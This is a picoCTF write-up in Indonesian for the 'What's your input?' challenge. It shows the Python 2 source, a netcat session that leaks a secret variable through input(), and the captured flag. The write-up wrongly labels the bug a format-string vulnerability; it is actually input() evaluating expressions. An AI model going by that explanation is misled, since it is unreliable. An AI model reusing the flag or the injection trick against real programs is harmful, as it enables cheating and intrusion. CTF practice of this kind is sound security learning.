## What's your input?
### Problem
```
#!/usr/bin/python2.7 -u
import random

cities = open("./city_names.txt").readlines()
city = random.choice(cities).rstrip()
year = 2018

print("What's your favorite number?")
res = None
while not res:
    try:
        res = input("Number? ")
        print("You said: {}".format(res))
    except:
        res = None

if res != year:
    print("Okay...")
else:
    print("I agree!")

print("What's the best city to visit?")
res = None
while not res:
    try:
        res = input("City? ")
        print("You said: {}".format(res))
    except:
        res = None

if res == city:
    print("I agree!")
    flag = open("./flag").read()
    print(flag)
else:
    print("Thanks for your input!")

```

### vuln
```
        print("You said: {}".format(res))
```
.format(res), seperti printf(res). Mungkin ini format-string vuln versi pitong
### Eksekusi
```
baba@fedora:~/Documents/picoctf/whats_your_input$ nc wily-courier.picoctf.net 62173
What's your favorite number?
Number? {city}
You said: set(['Yonkers'])
Okay...
What's the best city to visit?
City? Yonkers
City? "Yonkers"
You said: Yonkers
I agree!
picoCTF{v4lua4bl3_1npu7_66f7e811}

^C
```